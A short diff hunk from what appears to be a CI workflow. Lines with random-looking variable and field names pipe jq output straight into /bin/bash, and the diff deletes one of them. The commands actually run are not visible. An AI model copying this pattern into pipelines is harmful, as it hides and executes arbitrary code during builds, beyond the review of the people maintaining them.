@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$qqa27684" | jq -r .enp399 | /bin/bash
           echo $cikta90 | jq -r .xlvw6 | /bin/bash
           echo $nggfr38 | jq -r .hd4 | /bin/bash
-          echo $z16 | jq -r .xveor3289 | /bin/bash
           echo $thpf9471 | jq -r .kmw81568 | /bin/bash
 
       - name: Save results
